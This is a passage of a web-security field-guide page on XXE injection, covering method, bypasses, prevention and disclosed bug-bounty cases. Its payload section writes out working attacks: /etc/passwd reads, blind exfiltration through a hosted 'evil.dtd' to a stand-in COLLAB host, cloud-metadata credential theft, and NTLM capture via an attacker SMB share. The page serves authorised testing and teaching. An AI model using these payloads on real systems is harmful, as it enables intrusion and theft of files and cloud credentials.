@@ -1,0 +1,575 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>XML External Entities (XXE) · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>XML External Entities (XXE)</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="on" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>XML External Entities (XXE)</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>25</b></span><a class="chip lab" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>XXE</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>XML External Entity injection (XXE) happens when an XML parser resolves attacker-defined <strong>entities</strong> declared in a <code>&lt;!DOCTYPE&gt;</code>. A <code>SYSTEM</code>/<code>PUBLIC</code> entity makes the <em>server</em> fetch a URL or read a file and fold the result back into the document — one primitive that reads local files (<code>/etc/passwd</code>, source, <code>/proc/&lt;pid&gt;/environ</code>), performs SSRF into internal services and cloud metadata, steals Windows NTLM hashes, and (chained) reaches RCE.</p>
+<p>The core mechanic is the entity. A <strong>general</strong> entity (<code>&lt;!ENTITY xxe SYSTEM "..."&gt;</code>, referenced as <code>&amp;xxe;</code>) reads a resource into element text — great when output is reflected. A <strong>parameter</strong> entity (<code>&lt;!ENTITY % xxe SYSTEM "..."&gt;</code>, referenced as <code>%xxe;</code>) works inside the DTD itself and is the key to <strong>blind</strong> exfiltration, because you can nest it to build an outbound URL carrying the stolen data. Treat any XML sink as a file-read + SSRF primitive, not a parse error — and remember XML hides far beyond <code>Content-Type: application/xml</code> (Office docs, SVG, SAML, image metadata, SQL functions).</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Find the XML sink.</strong> Direct XML/SOAP/<code>.aspx</code> endpoints, SAML ACS, file uploads (any zip-of-XML or media container), XML-processing SQL functions, and JSON APIs that <em>also</em> speak XML.</li><li><strong>Confirm DOCTYPE processing</strong> with a harmless out-of-band probe — no file read, just "does the server dial my host". A callback proves external entities resolve.</li><li><strong>Check for reflection.</strong> Reference a <code>file://</code> entity in an element whose value comes back in the response — that's an in-band read. If nothing reflects, go <strong>blind/OOB</strong> with an external DTD.</li><li><strong>Read a file</strong> to prove impact (<code>/etc/passwd</code>, or a Windows path for <code>.NET</code>/IIS). Use <code>php://filter</code> base64 to survive multi-line files.</li><li><strong>Pivot outward</strong> — swap <code>file://</code> for <code>http://</code> to reach internal services and cloud metadata; on Windows point at a UNC path to capture NTLM.</li><li><strong>Chain</strong> to secrets, deserialization, or RCE (see Escalation).</li></ol>
+<div class="pre" data-lang="xml">&lt;!-- Step 2: bare OOB probe — a hit on COLLAB confirms parsing --&gt;
+&lt;!DOCTYPE a PUBLIC "-//B/A/EN" "http://COLLAB/probe"&gt;
+&lt;a&gt;&lt;/a&gt;</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>The <code>&lt;!DOCTYPE a PUBLIC "-//B/A/EN" "http://COLLAB/x"&gt;</code> one-liner is the cheapest confirmation you have — it fires from a <em>parameter</em>-free position and works on many parsers that block general entities but still fetch the external subset. Validate parsing this way before spending time on a weaponised payload.</div></div>
+<h2 class="sec" id="where-xml-parsing-hides"><span class="tick">§</span>Where XML parsing hides</h2>
+<p>The sink is rarely labelled "XML". Probe all of these:</p>
+<ul><li><strong>Direct XML / SOAP / legacy <code>.aspx</code></strong> — spellcheck and helper endpoints, XML login endpoints, PeopleSoft <code>/PSIGW/PeopleSoftServiceListeningConnector</code>, PKI <code>certrequests</code>.</li><li><strong>JSON APIs that also speak XML</strong> — flip <code>Content-Type</code> to <code>application/xml</code>, translate the body, add a DOCTYPE; the marshaller (JAXB / Jackson-XML / .NET) transparently resolves entities the JSON path hid.</li><li><strong>File upload → XML container</strong> — Office Open XML (<code>.xlsx</code>/<code>.docx</code>/<code>.xlf</code>), SVG avatars rendered by ImageMagick/librsvg, image <strong>XMP metadata</strong> in a JPEG, RIFF/<strong>WAV</strong> ID3 chunks, healthcare <strong>C-CDA</strong> imports, and any upload a <em>second</em> endpoint re-parses by path.</li><li><strong>SSO / SAML</strong> — the ACS endpoint base64-decodes and parses <code>SAMLResponse</code> XML, often <em>before</em> signature enforcement.</li><li><strong>XML-processing SQL functions</strong> — Hive/Spark <code>xpath_string()</code>, <code>XMLTABLE</code>.</li><li><strong>Deserialization → XML</strong> — a gadget object whose field is fed to a parser with entities on.</li><li><strong>Crawlers / fetchers</strong> — SEO site-audit tools parsing a user-supplied <code>sitemap.xml</code>, URL-param XML fetchers.</li></ul>
+<h2 class="sec" id="payload-techniques"><span class="tick">§</span>Payload techniques</h2>
+<p>Pick the variant that matches what the sink gives you back (reflection, nothing, or a rendered image).</p>
+<h3 class="sub" id="in-band-file-read">In-band file read</h3>
+<p>Output is reflected — use a general entity and reference it in a reflected element. Match the OS path style.</p>
+<div class="pre" data-lang="xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+&lt;r&gt;&lt;textToCheck&gt;&amp;xxe;&lt;/textToCheck&gt;&lt;/r&gt;</div>
+<div class="pre" data-lang="xml">&lt;!-- Windows / .NET / IIS target --&gt;
+&lt;!DOCTYPE r [ &lt;!ENTITY a SYSTEM "file:///c:/Windows/System32/drivers/etc/hosts"&gt; ]&gt;
+&lt;r&gt;&lt;resp&gt;xml&lt;/resp&gt;&lt;textToCheck&gt;&amp;a;&lt;/textToCheck&gt;&lt;/r&gt;</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>Files with <code>&lt;</code>, <code>&amp;</code>, or multiple lines break XML parsing when read into a general entity. Wrap the read in <code>php://filter/convert.base64-encode/resource=...</code> (PHP targets) so the content arrives as inert base64 you decode offline. This is what makes reading source, configs, and <code>/proc/.../environ</code> reliable rather than corrupt.</div></div>
+<h3 class="sub" id="blind-out-of-band-exfiltration">Blind out-of-band exfiltration</h3>
+<p>No reflected output — this is the default case. Use an <strong>external DTD</strong> on your host plus a <strong>nested parameter entity</strong> that embeds the file content into an outbound request. A <code>%</code> inside an entity value would be expanded immediately by the parser, so you encode the inner <code>%</code> as <code>&amp;#x25;</code> to defer expansion until the outer entity fires — that's what lets the inner <code>&lt;!ENTITY&gt;</code> be built with the file content already substituted in.</p>
+<div class="pre" data-lang="xml">&lt;!-- injected into the vulnerable endpoint --&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "https://COLLAB/evil.dtd"&gt; %xxe; ]&gt;
+&lt;foo&gt;&lt;/foo&gt;</div>
+<div class="pre" data-lang="xml">&lt;!-- evil.dtd, hosted on COLLAB --&gt;
+&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://COLLAB/?x=%file;'&gt;"&gt;
+%eval;
+%exfiltrate;</div>
+<p>The base64 blob arrives in your <code>COLLAB</code> access log. Read config files first (<code>/etc/nginx/...</code>, app config) to map internal/reverse-proxied services for the next pivot.</p>
+<h3 class="sub" id="ssrf-and-cloud-metadata">SSRF and cloud metadata</h3>
+<p>Swap <code>file://</code> for <code>http://</code> and the entity becomes an SSRF request. From any outbound-capable XXE, go straight for cloud metadata.</p>
+<div class="pre" data-lang="xml">&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys"&gt;
+]&gt;
+&lt;stockCheck&gt;&amp;xxe;&lt;/stockCheck&gt;</div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>GCP's <code>v1beta1</code> metadata path (unlike <code>v1</code>) needs <strong>no</strong> <code>Metadata-Flavor: Google</code> header, so it is reachable through plain XXE — where GCP <code>v1</code> (which requires that header) or AWS IMDSv2 (which requires a PUT-issued <code>X-aws-ec2-metadata-token</code> header) would need a header you can't set from an entity. On AWS, target the header-free IMDSv1 endpoint <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>.</div></div>
+<p>If a plain <code>http://</code> entity returns nothing (the parser won't reflect a raw HTTP body), wrap it in <code>php://filter</code> to force the response into a base64 entity value:</p>
+<div class="pre" data-lang="xml">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1:1337/"&gt;</div>
+<h3 class="sub" id="xinclude-fallback">XInclude fallback</h3>
+<p>When you don't control the whole document (you inject into one element) or <code>SYSTEM</code> entities are stripped, <code>XInclude</code> often still works. It needs no DOCTYPE.</p>
+<div class="pre" data-lang="xml">&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include href="file:///etc/passwd" parse="text"/&gt;
+&lt;/foo&gt;</div>
+<div class="pre" data-lang="xml">&lt;!-- SSRF variant, e.g. rendered onto an SVG-&gt;PNG output --&gt;
+&lt;text x="10" y="10"&gt;&lt;xi:include href="https://internal/" parse="text"/&gt;&lt;/text&gt;</div>
+<h3 class="sub" id="container-format-xxe-file-upload">Container-format XXE (file upload)</h3>
+<p>The XML lives <em>inside</em> a legitimate-looking file, evading naive content checks. Unzip / hex-edit, inject a DOCTYPE, repackage, upload.</p>
+<div class="pre" data-lang="bash"># Office Open XML (.xlsx/.docx/.xlf): edit the inner worksheet/part XML, then re-zip
+unzip book.xlsx -d x
+# add to x/xl/worksheets/sheet1.xml a DOCTYPE + entity, reference &amp;xxe; in a cell value:
+#   &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
+cd x &amp;&amp; zip -r ../evil.xlsx . &amp;&amp; cd ..</div>
+<p>For <strong>SVG</strong>, the parser renders <code>&lt;text&gt;&amp;xxe;&lt;/text&gt;</code> onto the output PNG = in-band read. For <strong>JPEG XMP</strong> or <strong>WAV/RIFF</strong>, hex-edit the embedded XML chunk's entity URL while keeping the container structure intact so the file still validates.</p>
+<h3 class="sub" id="windows-ntlm-hash-theft">Windows NTLM hash theft</h3>
+<p>On Windows, a <code>file://</code> (or UNC) reference to an attacker SMB share makes the server authenticate outbound — capture the NTLMv2 hash with <code>responder</code> or <code>impacket-smbserver</code>.</p>
+<div class="pre" data-lang="xml">&lt;!DOCTYPE r [ &lt;!ENTITY a SYSTEM "file://ATTACKER-SMB/share/x"&gt; ]&gt;
+&lt;r&gt;&lt;textToCheck&gt;&amp;a;&lt;/textToCheck&gt;&lt;/r&gt;</div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td>Upload extension whitelist</td><td>whitelist enforced only via client-submitted <code>allow_file_type_list</code> param — strip/extend it, rename to <code>.xml</code>, then force a second endpoint to re-parse it</td><td>#500515</td></tr><tr><td>URL regex on SVG fetch</td><td>reference external SVG via <code>//attacker/x.svg</code> (UNC/SMB) to bypass the <code>http(s)://</code> block</td><td>#347139</td></tr><tr><td><code>SYSTEM</code> entity filtered</td><td>fall back to <code>XInclude</code> (<code>xi:include parse="text"</code>)</td><td>#347139</td></tr><tr><td>JSON-only endpoint</td><td>resend as <code>Content-Type: application/xml</code> — the marshaller switches and entities resolve</td><td>#106797</td></tr><tr><td>SAML signature check</td><td>entity processing happens during parse, <em>before</em> signature validation</td><td>#106865</td></tr><tr><td>No reflected output</td><td>external DTD + nested parameter entity for OOB exfil</td><td>#1217114</td></tr><tr><td>Multi-line file breaks DTD syntax</td><td><code>php://filter/convert.base64-encode</code> to flatten the read into inert base64</td><td>#416123</td></tr><tr><td><code>http://</code> SSRF returns nothing</td><td>wrap in <code>php://filter/read=convert.base64-encode/resource=http://…</code> to force the body into the entity</td><td>#415202</td></tr><tr><td>PHP8 defaults look safe</td><td><code>LIBXML_NOENT</code> re-enables entity substitution; old <code>libxml_disable_entity_loader</code> guards became no-ops</td><td>#1095645</td></tr><tr><td>Naive file-type / content check</td><td>hide the payload inside a legit <code>.xlsx</code> / JPEG XMP / WAV container's internal XML</td><td>#836877</td></tr><tr><td>Patched fetcher</td><td>blind XXE via a remote-XML-fetching URL parameter (patch bypass)</td><td>#486732</td></tr></tbody></table></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>XXE is a launchpad, not a destination. In order of value:</p>
+<ul><li><strong>XXE → cloud metadata → account takeover</strong> — SSRF the entity to IMDS/metadata, read IAM creds or SSH keys, then own the cloud account (e.g. Hive <code>xpath_string()</code> → GCP <code>v1beta1</code> → SSH keys, #742808).</li><li><strong>XXE → SSRF → RCE</strong> — pivot the SSRF to an internal admin service and deploy code (PeopleSoft PSIGW → localhost Apache Axis <code>AdminService</code> service deploy, CVE-2017-3548, #710654).</li><li><strong>XXE → NTLM hash theft</strong> — on Windows, <code>file://ATTACKER-SMB/share</code> yields a crackable/relayable NTLMv2 hash (#715949).</li><li><strong>File read → secret harvest → pivot</strong> — don't stop at <code>/etc/passwd</code>: walk config → pidfile → <code>/proc/&lt;pid&gt;/environ</code> to lift API tokens and cloud keys, then reuse them against the real service (#416123).</li><li><strong>XXE → deserialization RCE</strong> — the <code>phar://</code> wrapper turns a PHP file-read XXE into object injection (#1095645); conversely, a deserialization gadget can <em>reach</em> a hidden XXE sink (#415202).</li><li><strong>Entity-expansion DoS</strong> — Billion Laughs if the parser has no expansion limit.</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Disable DOCTYPE / external entities at the parser</strong> — this is the real fix. Java: <code>FEATURE_SECURE_PROCESSING</code> + <code>disallow-doctype-decl</code>. .NET: <code>XmlResolver = null</code> / <code>DtdProcessing = Prohibit</code>. PHP: <code>libxml_set_external_entity_loader(null)</code> and <strong>never</strong> pass <code>LIBXML_NOENT</code>. A parser hardened this way makes even a scary DOCTYPE inert — verify this before claiming impact on a report.</li><li><strong>Also disable XInclude and network access</strong> — killing <code>SYSTEM</code> entities alone still leaves the XInclude fallback.</li><li><strong>Authenticate untrusted XML before parsing it</strong> — SAML must validate the signature <em>first</em>; parse-before-verify is the whole bug.</li><li><strong>Validate upload content, not client-supplied type lists</strong>, and confirm no second endpoint re-parses stored files.</li><li><strong>Audit PHP8 / libxml migrations</strong> — old <code>libxml_disable_entity_loader(true)</code> guards silently became no-ops on libxml ≥ 2.9; <code>LIBXML_NOENT</code> is a live footgun that <em>re-enables</em> substitution.</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> — Repeater for payloads, <strong>Collaborator</strong> for OOB/blind callbacks, Content-Type flipping on JSON endpoints.</li><li><strong>Hosted external DTD + DNS/HTTP listener</strong> (interactsh, your own VPS) for two-stage blind exfil.</li><li><strong>responder</strong> / <strong>impacket-smbserver</strong> — capture NTLM on Windows targets.</li><li><strong><code>unzip</code> + <code>zip</code> / 7-Zip</strong> — edit OOX / <code>.xlf</code> / SVG containers; a <strong>hex editor</strong> for WAV and JPEG-XMP injection.</li><li><strong><code>xxeserv</code> / <code>xxeftp</code></strong> — OOB FTP exfil servers for Java targets.</li><li><strong>ImageMagick / librsvg</strong> — local repro for SVG → raster XXE payloads.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>25</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-500515" style="--sv:var(--sev-crit)" data-sev="4" data-votes="318" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE via upload-filter bypass into a .NET XML page-parser</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#500515</b> · starbucks · awarded · 318 votes · resolved</div>
+<div class="taxo"><span>Program <b>starbucks</b></span><span>Surface <b>web</b></span><span>Chain <b>file upload filter bypass -&gt; stored XML -&gt; server-side</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An avatar/photo upload sends a client-controllable `allow_file_type_list` parameter; stripping/extending it lets an attacker upload a .xml (or .html) file, which a separate .NET endpoint (hxdynamicpage6.aspx / hxxmlservice6.aspx) then parses with DOCTYPE and external entities enabled.</p>
+<h4>Method</h4><ol><li>Intercept the image upload; delete or append to `allow_file_type_list` (e.g. add `xml;html;`) and rename the file to .xml/.html to bypass the extension whitelist.</li><li>Note the returned temp file path (temp_uploaded_&lt;guid&gt;.xml).</li><li>Force the .NET parser to process it by setting `_hxpage=tempfiles/temp_uploaded_&lt;guid&gt;.xml` on hxdynamicpage6.aspx, or `HX_PAGE_NAME` on hxxmlservice6.aspx.</li><li>Uploaded XML with an external-DTD reference makes the IIS/ASP.NET server call the attacker DTD host, confirming XXE.</li></ol>
+<div class="pre">POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_&lt;guid&gt;.xml&amp;max_file_size_kb=1024&amp;allow_file_type_list=xml;jpg;jpeg;png;bmp;
+
+# or:
+POST /retail/hxpublic_v6/hxxmlservice6.aspx
+HX_PAGE_NAME="tempfiles/temp_uploaded_&lt;guid&gt;.xml"</div>
+<p class="insight"><b>Insight —</b> When an upload sends a client-side list of allowed extensions, strip/extend it. Then hunt for a second endpoint that re-parses the uploaded file by path/param -- an upload that becomes XML input to a server-side parser is an XXE sink. On Windows/IIS+ASP.NET, escalate toward NTLM hash theft.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/500515" target="_blank" rel="noopener">hackerone.com/reports/500515</a></span><a class="src" href="#report-500515" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-836877" style="--sv:var(--sev-crit)" data-sev="4" data-votes="137" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE hidden in the XMP (XML) metadata of an uploaded JPEG</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#836877</b> · informatica · none · 137 votes · resolved</div>
+<div class="taxo"><span>Program <b>informatica</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An avatar upload (Java servlet, .jspa) extracts and parses the JPEG's XMP metadata block as XML with external entities enabled, so an XXE payload embedded in the XMP segment of an otherwise valid image is processed server-side.</p>
+<h4>Method</h4><ol><li>Craft a valid JPEG whose XMP metadata segment contains a DOCTYPE referencing an attacker external DTD (Burp Collaborator).</li><li>Upload it via /edit-profile-avatar!uploadImage.jspa.</li><li>Receive the Collaborator callback (GET /x.dtd, User-Agent Java...) confirming XXE; escalate to file read (/etc/passwd).</li></ol>
+<div class="pre"># XMP metadata block embedded in a real JPEG:
+&lt;?xpacket begin='...'?&gt;
+&lt;x:xmpmeta xmlns:x='adobe:ns:meta/'&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY % ext SYSTEM "http://COLLAB/x.dtd"&gt; %ext; ]&gt;
+... 
+&lt;?xpacket end='r'?&gt;</div>
+<p class="insight"><b>Insight —</b> Image-processing/avatar features read XMP metadata, which is XML. Embed XXE in the XMP of a genuine JPEG to slip past image-validation and reach the metadata XML parser. A Java User-Agent on the OOB callback confirms a Java parser.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/836877" target="_blank" rel="noopener">hackerone.com/reports/836877</a></span><a class="src" href="#report-836877" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-312543" style="--sv:var(--sev-crit)" data-sev="4" data-votes="114" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>XXE in a site-audit/SEO crawler that parses a user-supplied sitemap.xml</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#312543</b> · semrush · awarded · 114 votes · resolved</div>
+<div class="taxo"><span>Program <b>semrush</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Site Audit crawler downloads a sitemap.xml URL you provide and parses it with a vulnerable Java XML processor; external parameter entities + an attacker external DTD enable OOB file read and directory listing.</p>
